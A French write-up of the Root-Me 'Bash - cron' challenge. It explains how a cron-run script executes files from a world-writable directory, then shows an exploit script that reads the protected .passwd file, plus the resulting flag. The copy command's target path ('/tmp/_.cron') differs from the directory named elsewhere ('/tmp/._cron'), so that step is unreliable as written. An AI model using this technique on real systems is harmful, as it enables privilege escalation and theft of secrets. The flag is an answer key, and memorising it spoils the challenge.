## Source et énoncé du CTF

<https://www.root-me.org/fr/Challenges/App-Script/Bash-cron>


## Write-up

Le titre du challenge semble laisser penser que le but du CTF est d'exploiter une faiblesse de configuration de *cron*. 


### Analyse du challenge

En listant les fichiers du répertoire de travail, on obtient le résultat suivant :
```console
app-script-ch4@challenge02:~$ ls -la
total 24
dr-xr-x---  2 app-script-ch4-cracked app-script-ch4         4096 Dec 10  2021 .
drwxr-xr-x 25 root                   root                   4096 Sep  5  2023 ..
-r--------  1 root                   root                    629 Dec 10  2021 ._perms
-rw-r-----  1 root                   root                     42 Dec 10  2021 .git
-r--r-----  1 app-script-ch4-cracked app-script-ch4-cracked   16 Dec 10  2021 .passwd
-r-xr-x---  1 app-script-ch4-cracked app-script-ch4          767 Dec 10  2021 ch4
lrwxrwxrwx  1 root                   root                     11 Dec 10  2021 cron.d -> /tmp/._cron
```
On comprend qu'il va falloir exploiter une faiblesse de configuration de *cron* pour lire le contenu du fichier *.passwd*, accessible en lecture seulement pour l'utilisateur *app-script-ch4-cracked*.

En affichant le contenu du fichier */challenge/app-script/ch4*, on obtient le résultat suivant :
```console
app-script-ch4@challenge02:~$ cat ch4
#!/bin/bash

# Sortie de la commande 'crontab -l' exécutée en tant que app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# Vous N'avez PAS à modifier la crontab(chattr +i t'façons)

# Output of the command 'crontab -l' run as app-script-ch4-cracked:
# */1 * * * * /challenge/app-script/ch4/ch4
# You do NOT need to edit the crontab (it's chattr +i anyway)

# hiding stdout/stderr
exec 1>/dev/null 2>&1

wdir="cron.d/"
challdir=${0%/*}
cd "$challdir"


if [ ! -e "/tmp/._cron" ]; then
    mkdir -m 733 "/tmp/._cron"
fi

ls -la "${wdir}" | while read task; do
    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
        timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
    fi
    rm -f "${PWD}/${wdir}${task}"
done

rm -rf cron.d/*
```
Nous relevons trois choses :

* Le répertoire *~/cron.d* est un lien symbolique vers le répertoire */tmp/._cron*
* Le script Bash */challenge/app-script/ch4* est exécuté automatiquement toutes les minutes par *cron* via le *crontab* de l'utilisateur *app-script-ch4-cracked* :
```console
*/1 * * * * /challenge/app-script/ch4/ch4*
```
* Le script Bash */challenge/app-script/ch4* et le *crontab*  de l'utilisateur *app-script-ch4-cracked* ne sont pas à modifier et ne sont pas modifiable car les attribus de ces fichiers on été modifiés pour que les fichiers soient immuables (impossibilité de modification, renommage, suppression, écriture, même par *root*) via la commande `chattr +i`.

On en conclus qu'il faudra exploiter une faiblesse du script Bash */challenge/app-script/ch4* utilisé par *cron* via le *crontab* de l'utilisateur *app-script-ch4-cracked* pour faire une escalade de privilèges.


### Commentaire du script Bash

Analysons le script Bash :

* Toutes les sorties des commandes passées dans le script Bash (sortie standard et sortie d'erreur) seront envoyées dans */dev/null* :
```console
exec 1>/dev/null 2>&1
```
* Définition des variables :
```console
wdir="cron.d/"
challdir=${0%/*}
```
Remarques :

  * `${0}` renvoie le chemin complet du script Bash : */challenge/app-script/ch4*
  * En langage Bash, `${variable%pattern}` permet de supprimer la plus courte correspondance du *pattern* à la fin de la valeur de la *variable*
  * Ainsi, `challdir=${0%/*}` renverra le chemin complet du script Bash privé de tout ce qui se trouve derrière le dernier */* (*/* compris), soit : */challenge/app-script/*

* Si le répertoire */tmp/._cron* n'existe pas, le créer avec des droits spécifiques :
```console
if [ ! -e "/tmp/._cron" ]; then
    mkdir -m 733 "/tmp/._cron"
fi
```
* Exécution de tous les scripts présents dans le répertoire */tmp/._cron* :
```console
ls -la "${wdir}" | while read task; do
    if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]; then
        timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
    fi
    rm -f "${PWD}/${wdir}${task}"
done
```
Remarques : 

  * Énumération de tous les noms de fichiers du répertoire */tmp/._cron* :
```console
ls -la "${wdir}"
```
Chacun des noms de fichiers énumérés sera stocké dans la variable *task* et lu par la boucle *while*.

  * Test permettant de vérifier si les fichiers du répertoire */tmp/._cron* existent ET sont exécutables :
```console
if [ -f "${wdir}${task}" -a -x "${wdir}${task}" ]
```
  * Exécution de tous les scripts Bash du répertoire */tmp/._cron* en mode *privilège* (*-p*). Les scripts Bash exécutés sont limités en temps d'exécution via la commande *timelimit* exécutée en mode silencieux (*-q*). Le temps maximal d'exécution est placé à 5 secondes (*-t 5*). Si ce temps d'exécution est dépassé, un signal SIGKILL est envoyé au processus (*-s9*) et un signal SIGKILL est envoyé à l'ensemble du groupe de processus (*-S9*) : 
```console
timelimit -q -s9 -S9 -t 5 bash -p "${PWD}/${wdir}${task}"
```
  * À chaque fin de la boucle *While*, le script exécuté est supprimé :
```console
rm -f "${PWD}/${wdir}${task}
```
  * À la fin du script, tout le contenu du répertoire */tmp/._cron* est supprimé :
```console
rm -rf cron.d/*
```

### Exploitation

Pour exploiter le script Bash décrit précédemment, on en déduit qu'il s'agira de créer un script Bash exécutable permettant d'afficher le contenu du fichier */challenge/app-script/ch4/.passwd* et de le placer dans le répertoire */tmp/._cron*. 

Nous travaillerons temporairement dans le répertoire */tmp* car il est accessible en écriture à l'utilisateur *app-script-ch4*. De plus, le contenu du répertoire */tmp/._cron* est vidé toutes les minutes à chaque passage de la tâche *cron* de l'utilisateur *app-script-ch4-craked*. Nous copierons ensuite l'exploit dans le répertoire */tmp/._cron* pour que l'exécution se fasse :
```console
app-script-ch4@challenge02:~$ touch /tmp/exploit.sh

app-script-ch4@challenge02:~$ chmod 775 /tmp/exploit.sh

app-script-ch4@challenge02:~$ ls -la /tmp/exploit.sh
-rwxrwxr-x 1 app-script-ch4 app-script-ch4 74 Sep  7 09:53 /tmp/exploit.sh

app-script-ch4@challenge02:~$ vi /tmp/exploit.sh

app-script-ch4@challenge02:~$ cat /tmp/exploit.sh
#!/bin/bash
/bin/cat /challenge/app-script/ch4/.passwd >> /tmp/results.txt

app-script-ch4@challenge02:~$ cp -p /tmp/exploit.sh /tmp/_.cron/exploit.sh
```
Il ne nous reste plus qu'à attendre approximativement une minute pour afficher le contenu du fichier */tmp/results.txt* pour obtenir le flag :
```console
app-script-ch4@challenge02:~$ cat /tmp/results.txt
Vys3OS3iStUapDj
```


## Flag

Vys3OS3iStUapDj